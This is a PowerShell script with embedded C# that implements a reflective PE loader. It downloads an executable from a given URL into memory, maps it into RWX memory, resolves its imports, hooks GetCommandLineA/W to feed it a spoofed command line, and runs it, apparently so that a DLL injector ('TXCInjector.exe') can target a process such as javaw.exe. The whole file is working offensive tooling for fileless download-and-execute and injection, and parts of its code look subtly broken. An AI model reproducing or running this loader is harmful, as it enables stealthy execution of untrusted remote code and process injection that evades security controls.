# loader.ps1 - full reflective PE loader with arg spoofing
# usage: .\loader.ps1 -Url "https://..." -DllPath "C:\dll.dll" -TargetProc "javaw.exe"

param(
    [Parameter(Mandatory=$true)][string]$Url,
    [Parameter(Mandatory=$true)][string]$DllPath,
    [Parameter(Mandatory=$true)][string]$TargetProc
)

# download exe bytes into memory
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0")
$exeBytes = $wc.DownloadData($Url)
Write-Host "[+] downloaded $($exeBytes.Length) bytes from url"

# compile the native loader
$cs = @'
using System;
using System.Runtime.InteropServices;

public unsafe class ReflectiveExeLoader
{
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, int type, int protect);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, int protect, out uint oldProt);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr LoadLibraryA(string name);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr GetProcAddress(IntPtr mod, string proc);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateThread(IntPtr attr, UIntPtr stack, IntPtr start, IntPtr param, int flags, out int tid);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr h, int timeout);

    // custom args storage
    static IntPtr g_fakeCmdLineA = IntPtr.Zero;
    static IntPtr g_fakeCmdLineW = IntPtr.Zero;

    // replacement GetCommandLineA
    static IntPtr HookedGetCommandLineA() { return g_fakeCmdLineA; }
    // replacement GetCommandLineW
    static IntPtr HookedGetCommandLineW() { return g_fakeCmdLineW; }

    static uint RvaToOffset(byte[] pe, int peOff, ushort numSec, int secStart, uint rva)
    {
        for (int i = 0; i < numSec; i++)
        {
            int off = secStart + i * 40;
            uint vSize = BitConverter.ToUInt32(pe, off + 8);
            uint vAddr = BitConverter.ToUInt32(pe, off + 12);
            uint rSize = BitConverter.ToUInt32(pe, off + 16);
            uint rPtr = BitConverter.ToUInt32(pe, off + 20);
            if (rva >= vAddr && rva < vAddr + Math.Max(vSize, rSize))
                return rva - vAddr + rPtr;
        }
        return 0;
    }

    static IntPtr RvaToVa(IntPtr baseAddr, byte[] pe, int peOff, ushort numSec, int secStart, uint rva)
    {
        for (int i = 0; i < numSec; i++)
        {
            int off = secStart + i * 40;
            uint vSize = BitConverter.ToUInt32(pe, off + 8);
            uint vAddr = BitConverter.ToUInt32(pe, off + 12);
            if (rva >= vAddr && rva < vAddr + vSize)
                return new IntPtr(baseAddr.ToInt64() + (rva - vAddr));
        }
        return IntPtr.Zero;
    }

    public static int LoadAndRun(byte[] exeBytes, string cmdLine)
    {
        // parse headers
        int peOff = BitConverter.ToInt32(exeBytes, 0x3C);
        ushort machine = BitConverter.ToUInt16(exeBytes, peOff + 4);
        if (machine != 0x8664) { Console.WriteLine("[-] not x64"); return -1; }
        ushort numSec = BitConverter.ToUInt16(exeBytes, peOff + 6);
        ushort optSize = BitConverter.ToUInt16(exeBytes, peOff + 20);
        int optOff = peOff + 24;
        uint entryRva = BitConverter.ToUInt32(exeBytes, optOff + 16);
        ulong imageBase = BitConverter.ToUInt64(exeBytes, optOff + 24);
        uint sizeOfImage = BitConverter.ToUInt32(exeBytes, optOff + 56);
        uint sizeOfHeaders = BitConverter.ToUInt32(exeBytes, optOff + 60);

        Console.WriteLine("[*] entry_rva=0x" + entryRva.ToString("X") + " image_base=0x" + imageBase.ToString("X") + " size=0x" + sizeOfImage.ToString("X"));
        int secStart = optOff + optSize;

        // allocate RWX at preferred size
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sizeOfImage, 0x3000, 0x40);
        if (mem == IntPtr.Zero) { Console.WriteLine("[-] alloc failed"); return -1; }
        Console.WriteLine("[*] mapped at 0x" + mem.ToInt64().ToString("X"));

        // copy headers
        fixed (byte* srcPtr = exeBytes)
        {
            Buffer.MemoryCopy(srcPtr, (void*)mem, sizeOfHeaders, sizeOfHeaders);

            // copy sections
            for (int i = 0; i < numSec; i++)
            {
                int so = secStart + i * 40;
                string name = System.Text.Encoding.ASCII.GetString(exeBytes, so, 8).TrimEnd('\0');
                uint vSize = BitConverter.ToUInt32(exeBytes, so + 8);
                uint vAddr = BitConverter.ToUInt32(exeBytes, so + 12);
                uint rSize = BitConverter.ToUInt32(exeBytes, so + 16);
                uint rPtr = BitConverter.ToUInt32(exeBytes, so + 20);
                if (rSize > 0 && rPtr > 0)
                {
                    uint copyLen = Math.Min(rSize, vSize == 0 ? rSize : vSize);
                    void* dst = (void*)(mem.ToInt64() + vAddr);
                    void* src = (void*)IntPtr.Add(new IntPtr(srcPtr), (int)rPtr);
                    Buffer.MemoryCopy(src, dst, copyLen, copyLen);
                    Console.WriteLine("[*] section " + name + " mapped");
                }
            }

            // apply base relocations if needed
            long delta = mem.ToInt64() - (long)imageBase;
            if (delta != 0)
            {
                uint relocRva = BitConverter.ToUInt32(exeBytes, optOff + 152);
                uint relocSize = BitConverter.ToUInt32(exeBytes, optOff + 156);
                if (relocRva != 0)
                {
                    Console.WriteLine("[*] applying relocations delta=" + delta);
                    long cur = mem.ToInt64() + relocRva;
                    long end = cur + relocSize;
                    while (cur < end)
                    {
                        uint pageRva = *(uint*)cur;
                        uint blockSize = *(uint*)(cur + 4);
                        if (blockSize == 0) break;
                        int numEntries = (int)((blockSize - 8) / 2);
                        for (int e = 0; e < numEntries; e++)
                        {
                            ushort entryVal = *(ushort*)(cur + 8 + e * 2);
                            ushort type = (ushort)(entryVal >> 12);
                            ushort offset = (ushort)(entryVal & 0xFFF);
                            if (type == 10) // IMAGE_REL_BASED_DIR64
                            {
                                ulong* patchAddr = (ulong*)(cur + pageRva + offset + (mem.ToInt64() - mem.ToInt64()));
                                // need absolute address relative to image start
                                ulong* realAddr = (ulong*)(mem.ToInt64() + pageRva + offset);
                                *realAddr += (ulong)delta;
                            }
                            else if (type == 3) // IMAGE_REL_BASED_HIGHLOW
                            {
                                uint* realAddr = (uint*)(mem.ToInt64() + pageRva + offset);
                                *realAddr += (uint)delta;
                            }
                        }
                        cur += blockSize;
                    }
                    Console.WriteLine("[*] relocations done");
                }
            }

            // resolve imports
            uint importRva = BitConverter.ToUInt32(exeBytes, optOff + 120);
            uint importSize = BitConverter.ToUInt32(exeBytes, optOff + 124);
            if (importRva != 0)
            {
                Console.WriteLine("[*] resolving imports...");
                long cur = mem.ToInt64() + importRva;
                while (true)
                {
                    uint lookupRva = *(uint*)cur;
                    uint nameRva = *(uint*)(cur + 12);
                    uint firstThunkRva = *(uint*)(cur + 16);
                    if (nameRva == 0 && firstThunkRva == 0) break;
                    if (lookupRva == 0) lookupRva = firstThunkRva;

                    int nameOff = (int)RvaToOffset(exeBytes, peOff, numSec, secStart, nameRva);
                    if (nameOff <= 0) break;
                    int nameEnd = nameOff;
                    while (exeBytes[nameEnd] != 0) nameEnd++;
                    string dllName = System.Text.Encoding.ASCII.GetString(exeBytes, nameOff, nameEnd - nameOff);
                    IntPtr hMod = LoadLibraryA(dllName);
                    if (hMod == IntPtr.Zero)
                    {
                        Console.WriteLine("[!] failed: " + dllName);
                    }
                    else
                    {
                        long thunkOff = RvaToVa(mem, exeBytes, peOff, numSec, secStart, firstThunkRva).ToInt64();
                        int idx = 0;
                        while (true)
                        {
                            ulong thunkVal = *(ulong*)(thunkOff + idx * 8);
                            if (thunkVal == 0) break;
                            IntPtr funcAddr;
                            if ((thunkVal & 0x8000000000000000UL) != 0)
                            {
                                funcAddr = GetProcAddress(hMod, new IntPtr((long)(thunkVal & 0xFFFF)));
                            }
                            else
                            {
                                long fnameOff = thunkVal & 0xFFFFFFFF; // RVA of function name
                                long fnameVa = RvaToVa(mem, exeBytes, peOff, numSec, secStart, (uint)fnameOff).ToInt64();
                                sbyte* fn = (sbyte*)fnameVa;
                                funcAddr = GetProcAddress(hMod, (string)null);
                                funcAddr = GetProcAddressByName(hMod, (byte*)fnameVa);
                            }
                            *(ulong*)(thunkOff + idx * 8) = (ulong)funcAddr.ToInt64();
                            idx++;
                        }
                    }
                    cur += 20;
                }
                Console.WriteLine("[*] imports resolved");
            }

            // hook GetCommandLineA/W in this module's IAT
            Console.WriteLine("[*] setting up args...");
            byte[] cmdA = System.Text.Encoding.ASCII.GetBytes(cmdLine);
            byte[] cmdW = System.Text.Encoding.Unicode.GetBytes(cmdLine);
            g_fakeCmdLineA = Marshal.AllocHGlobal(cmdA.Length + 1);
            g_fakeCmdLineW = Marshal.AllocHGlobal(cmdW.Length + 2);
            Marshal.Copy(cmdA, 0, g_fakeCmdLineA, cmdA.Length);
            Marshal.WriteByte(g_fakeCmdLineA, cmdA.Length, 0);
            Marshal.Copy(cmdW, 0, g_fakeCmdLineW, cmdW.Length);
            Marshal.WriteInt16(g_fakeCmdLineW, cmdW.Length, 0);

            // walk IAT looking for GetCommandLineA/W entries
            cur = mem.ToInt64() + importRva;
            while (true)
            {
                uint nameRva = *(uint*)(cur + 12);
                uint firstThunkRva = *(uint*)(cur + 16);
                if (nameRva == 0 && firstThunkRva == 0) break;
                int nameOff = (int)RvaToOffset(exeBytes, peOff, numSec, secStart, nameRva);
                if (nameOff <= 0) break;
                int ne = nameOff; while (exeBytes[ne] != 0) ne++;
                string dllName = System.Text.Encoding.ASCII.GetString(exeBytes, nameOff, ne - nameOff);
                if (dllName.ToLower().Contains("kernel32"))
                {
                    IntPtr hK32 = LoadLibraryA("kernel32.dll");
                    IntPtr origGCLA = GetProcAddress(hK32, "GetCommandLineA");
                    IntPtr origGCLW = GetProcAddress(hK32, "GetCommandLineW");

                    // get address of our hooks
                    IntPtr hookA = (IntPtr)(void*)Marshal.GetFunctionPointerForDelegate((GetCmdLineADelegate)HookedGetCommandLineA);
                    // actually use method pointer approach below

                    long iatVa = RvaToVa(mem, exeBytes, peOff, numSec, secStart, firstThunkRva).ToInt64();
                    int idx = 0;
                    while (true)
                    {
                        ulong val = *(ulong*)(iatVa + idx * 8);
                        if (val == 0) break;
                        // compare against known addresses
                        if (origGCLA != IntPtr.Zero && val == (ulong)origGCLA.ToInt64())
                        {
                            *(ulong*)(iatVa + idx * 8) = (ulong)GetHookAddressA().ToInt64();
                            Console.WriteLine("[*] hooked GetCommandLineA");
                        }
                        else if (origGCLW != IntPtr.Zero && val == (ulong)origGCLW.ToInt64())
                        {
                            *(ulong*)(iatVa + idx * 8) = (ulong)GetHookAddressW().ToInt64();
                            Console.WriteLine("[*] hooked GetCommandLineW");
                        }
                        idx++;
                    }
                }
                cur += 20;
            }
        }

        // set section protections properly
        for (int i = 0; i < numSec; i++)
        {
            int so = secStart + i * 40;
            uint vSize = BitConverter.ToUInt32(exeBytes, so + 8);
            uint vAddr = BitConverter.ToUInt32(exeBytes, so + 12);
            uint chars = BitConverter.ToUInt32(exeBytes, so + 36);
            int prot = 0x04; // PAGE_READWRITE default
            if ((chars & 0x20000000) != 0) prot = 0x20;       // EXECUTE
            else if ((chars & 0x40000000) != 0) prot = 0x04;  // READ
            else if ((chars & 0x80000000) != 0) prot = 0x04;  // WRITE
            if ((chars & 0x20000000) != 0 && (chars & 0x40000000) != 0) prot = 0x40; // ERW
            else if ((chars & 0x20000000) != 0 && (chars & 0x80000000) != 0) prot = 0x40;
            uint oldProt;
            IntPtr secVa = new IntPtr(mem.ToInt64() + vAddr);
            VirtualProtect(secVa, (UIntPtr)vSize, prot, out oldProt);
        }

        // jump to entry point on a new thread
        IntPtr ep = new IntPtr(mem.ToInt64() + entryRva);
        Console.WriteLine("[*] calling entry at 0x" + ep.ToInt64().ToString("X"));
        int tid;
        IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, ep, IntPtr.Zero, 0, out tid);
        if (hThread == IntPtr.Zero) { Console.WriteLine("[-] thread failed"); return -1; }
        WaitForSingleObject(hThread, 30000);
        Console.WriteLine("[+] execution finished");
        return 0;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr GetCmdLineADelegate();

    [DllImport("kernel32.dll", EntryPoint="GetProcAddress", SetLastError=true)]
    static extern IntPtr GetProcAddressRaw(IntPtr hMod, IntPtr ordinalOrName);

    // helper to get function pointer by name bytes
    [System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
    static IntPtr GetProcAddressByName(IntPtr hMod, byte* name)
    {
        // convert byte* to string
        string s = "";
        int i = 0;
        while (name[i] != 0) { s += (char)name[i]; i++; }
        return GetProcAddress(hMod, s);
    }

    static IntPtr GetHookAddressA()
    {
        // return address of HookedGetCommandLineA via delegate pinning
        var del = new GetCmdLineADelegate(HookedGetCommandLineA);
        return Marshal.GetFunctionPointerForDelegate(del);
    }
    static IntPtr GetHookAddressW()
    {
        var del = new GetCmdLineWDelegate(HookedGetCommandLineW);
        return Marshal.GetFunctionPointerForDelegate(del);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr GetCmdLineWDelegate();
}
'@

Add-Type -TypeDefinition $cs -Language CSharp

# build fake command line: "TXCInjector.exe <dll> <proc>"
$cmdLine = "`"TXCInjector.exe`" `"$DllPath`" `"$TargetProc`""
Write-Host "[*] cmdline: $cmdLine"

# execute
$result = [ReflectiveExeLoader]::LoadAndRun($exeBytes, $cmdLine)
if ($result -eq 0) { Write-Host "[+] success" } else { Write-Host "[-] exit code $result" }
